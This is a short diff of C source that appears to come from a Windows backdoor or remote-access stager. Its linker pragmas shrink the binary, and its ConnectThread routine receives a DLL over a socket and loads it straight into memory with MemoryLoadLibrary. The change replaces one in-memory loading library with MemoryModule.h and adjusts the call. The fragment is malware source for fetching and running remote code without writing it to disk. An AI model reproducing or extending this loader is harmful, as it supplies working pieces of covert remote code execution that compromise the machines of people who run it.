@@ -7,7 +7,8 @@
 //#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
 //#pragma comment(linker,"/ENTRY:WinMain")
 
-#include "MemLoadDll.h"
+//#include "MemLoadDll.h"
+#include "MemoryModule.h"
 
 struct MODIFY_DATA
 {
@@ -114,11 +115,11 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	shutdown(MainSocket, 0x02);
 	closesocket(MainSocket);
 
-	DWORD iRet, Err;
+	DWORD iRet;
 
 	if (msgHead.dwCmd == CMD_DLLDATA)
 	{
-		HMEMORYMODULE hModule = MemoryLoadLibrary(buf);
+		HMEMORYMODULE hModule = MemoryLoadLibrary(buf, msgHead.dwSize);
 		VirtualFree(buf, msgHead.dwSize);
 
 		if (hModule == NULL)
